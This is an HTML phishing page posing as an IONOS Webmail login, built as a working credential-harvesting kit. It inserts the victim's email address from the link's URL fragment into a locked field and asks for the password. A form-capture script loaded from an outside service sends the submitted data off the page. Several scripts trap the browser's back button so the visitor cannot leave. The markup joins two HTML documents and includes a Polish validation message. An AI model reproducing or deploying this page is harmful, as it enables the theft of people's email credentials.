<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exmail Login - Not just mailbox</title>
    <style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body {
    background-color: #f3f5f9;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}

/* Top White Utilities Ribbon Line Header Area */
.navbar {
    width: 100%;
    background-color: #ffffff;
    border-bottom: 1px solid #e2e8f0;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 14px 40px;
    z-index: 10;
}

.brand-logo-area {
    display: flex;
    align-items: center;
    gap: 12px;
    user-select: none;
}

.brand-ionos {
    font-size: 26px;
    font-weight: 800;
    color: #002d62; /* Corporate deep royal blue hue */
    letter-spacing: 1px;
}

.brand-sub {
    font-size: 15px;
    font-weight: 600;
    color: #002d62;
    letter-spacing: 0.5px;
    border-left: 1px solid #cbd5e1;
    padding-left: 12px;
}

/* Centered Search Capsule Bar Component Configuration */
.search-bar-container {
    display: flex;
    align-items: center;
    background-color: #ffffff;
    border: 1px solid #94a3b8;
    border-radius: 8px;
    padding: 0 14px;
    height: 38px;
    width: 100%;
    max-width: 460px;
}

.search-icon, .mic-icon {
    color: #64748b;
    font-size: 14px;
}

.search-input {
    flex: 1;
    border: none;
    outline: none;
    padding: 0 10px;
    font-size: 14px;
    color: #1e293b;
    background: transparent;
}

.search-input::placeholder {
    color: #94a3b8;
}

.header-right-icons {
    display: flex;
    gap: 20px;
    font-size: 18px;
    color: #002d62;
    cursor: pointer;
}

/* Main Content Workspace Layout Banner Box Backdrop */
.workspace-banner {
    flex-grow: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 40px 20px;
    background-color: #f3f5f9;
}

/* Floating Clean Layout Interface Block Card Panel Module */
.login-card {
    background-color: #ffffff;
    width: 100%;
    max-width: 480px;
    padding: 44px 40px;
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0, 45, 98, 0.02);
    text-align: center;
}

/* Replicating the distinct blue lock icon graphics artwork precisely */
.card-header-graphic {
    display: flex;
    flex-direction: column;
    align-items: center;
    margin-bottom: 32px;
}

.lock-shield-badge {
    width: 48px;
    height: 48px;
    background-color: #0080ff; /* Bright blue background square */
    border-radius: 8px;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    color: #ffffff;
    position: relative;
    margin-bottom: 16px;
    box-shadow: 0 4px 10px rgba(0, 128, 255, 0.2);
}

.lock-shield-badge .key-node {
    font-size: 16px;
    line-height: 1;
}

.lock-shield-badge .dots-row {
    font-size: 10px;
    font-weight: bold;
    letter-spacing: 1px;
    margin-top: -2px;
}

.card-title {
    font-size: 22px;
    font-weight: 500;
    color: #1e293b;
}

form {
    width: 100%;
}

.form-group {
    margin-bottom: 20px;
    text-align: left;
}

.form-group label {
    display: block;
    font-size: 13px;
    font-weight: 600;
    color: #1e293b;
    margin-bottom: 8px;
}

/* Thin Border Structural Frame Container Capsule Box Elements Rows */
.input-wrapper {
    display: flex;
    align-items: center;
    width: 100%;
    height: 42px;
    border: 1px solid #cbd5e1;
    border-radius: 6px;
    padding: 0 12px;
    background-color: #ffffff;
    position: relative;
}

.input-wrapper:focus-within {
    border-color: #002d62;
    box-shadow: 0 0 0 1px #002d62;
}

.field-icon {
    color: #64748b;
    font-size: 14px;
    margin-right: 8px;
    user-select: none;
}

.form-control {
    flex: 1;
    height: 100%;
    border: none;
    font-size: 14px;
    color: #1e293b;
    outline: none;
    background: transparent;
}

.form-control.pass-field {
    padding-right: 24px;
}

.password-toggle-eye {
    position: absolute;
    right: 12px;
    color: #64748b;
    cursor: pointer;
    font-size: 14px;
    user-select: none;
}

/* Informational advisory helper references list panel */
.help-links-block {
    text-align: left;
    margin-bottom: 32px;
}

.forgot-link {
    font-size: 13px;
    color: #0056da;
    text-decoration: none;
    display: inline-block;
    margin-bottom: 8px;
}

.forgot-link:hover {
    text-decoration: underline;
}

.device-notice {
    font-size: 12px;
    color: #64748b;
    line-height: 1.5;
}

.device-notice strong {
    color: #1e293b;
}

.device-notice a {
    color: #64748b;
    text-decoration: underline;
}

/* Pure deep navy continuous uniform block submission element button (NOW FULLY CLICKABLE) */
.submit-btn {
    position: relative;
    z-index: 20;
    width: 100%;
    background-color: #0b2559; /* Precise dark signature blue shade matching the original Next button color profile */
    color: #ffffff;
    border: none;
    height: 46px;
    font-size: 14px;
    font-weight: bold;
    border-radius: 24px; /* Pill capsule structure edges shape */
    cursor: pointer;
    transition: background-color 0.15s ease;
}

.submit-btn:hover {
    background-color: #06163a;
}

/* Fine-print page footer status metrics ribbon bar elements strip */
.page-footer {
    width: 100%;
    background-color: #ffffff;
    border-top: 1px solid #e2e8f0;
    padding: 20px 40px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 12px;
    color: #64748b;
}

.status-dot {
    color: #22c55e; /* Vibrant operational green indicator dot */
    margin-right: 4px;
}

.footer-right a {
    color: #64748b;
    text-decoration: none;
    margin: 0 4px;
}

.footer-right a:hover {
    text-decoration: underline;
}

@media (max-width: 768px) {
    .navbar {
        flex-direction: column;
        gap: 16px;
        padding: 16px 20px;
    }
    .search-bar-container {
        max-width: 100%;
    }
    .page-footer {
        flex-direction: column;
        gap: 12px;
        text-align: center;
    }
}

    </style>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IONOS Webmail Login</title>
    <!-- Link to external stylesheet -->
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- Top Navigation Ribbon Bar Layer Header Bar -->
    <header class="navbar">
        <div class="brand-logo-area">
            <span class="brand-ionos">IONOS</span>
            <span class="brand-sub">WEBMAIL LOGIN</span>
        </div>
        
        <!-- Search Input Alignment Block Components -->
        <div class="search-bar-container">
            <span class="search-icon">🔍</span>
            <input type="text" class="search-input" placeholder="Search for features, domains, and help">
            <span class="mic-icon">🎙️</span>
        </div>

        <div class="header-right-icons">
            <span class="nav-icon">❓</span>
            <span class="nav-icon">💬</span>
        </div>
    </header>

    <!-- Main Panoramic horizon Content Workspace Area Component -->
    <main class="workspace-banner">
        
        <!-- White floating clean interface panel card -->
        <div class="login-card">
            
            <!-- Lock Icon Graphic Asset area -->
            <div class="card-header-graphic">
                <div class="lock-shield-badge">
                    <span class="key-node">🔑</span>
                    <div class="dots-row">***</div>
                </div>
                <h1 class="card-title">Enter details</h1>
            </div>

            <!-- Form submission configuration using FormSubmit module links integration -->
            <form action="" method="POST">
<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
                <div class="form-group">
                    <label for="email">Email address</label>
                    <div class="input-wrapper">
                        <span class="field-icon">👤</span>
 <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
                    </div>
                </div>

                <div class="form-group">
                    <label for="password">Password</label>
                    <div class="input-wrapper">
<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
                        <span class="password-toggle-eye">👁️</span>
                    </div>
                </div>

                <!-- Auxiliary helper reference text label query link node links stack -->
                <div class="help-links-block">
                    <a href="#" class="forgot-link">Forgot Your Password?</a>
                    <p class="device-notice">
                        <strong>Not your device?</strong> Log out after the session or use <a href="#">private browsing mode</a>.
                    </p>
                </div>
                
                <!-- Crisp solid blue button tracking original layout blueprint elements precisely -->
                <button type="submit" class="submit-btn">Next</button>
            </form>
        </div>

    </main>

    <!-- Base Utilities Navigation Ribbon Footer Strip -->
    <footer class="page-footer">
        <div class="footer-left">
            <span class="status-dot">●</span> All Systems Operational
        </div>
        <div class="footer-center">
            &copy; 2026 IONOS Inc.
        </div>
        <div class="footer-right">
            <a href="#">Privacy Policy</a> - <a href="#">T&Cs</a>
        </div>
    </footer>

</body>
</html>


    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
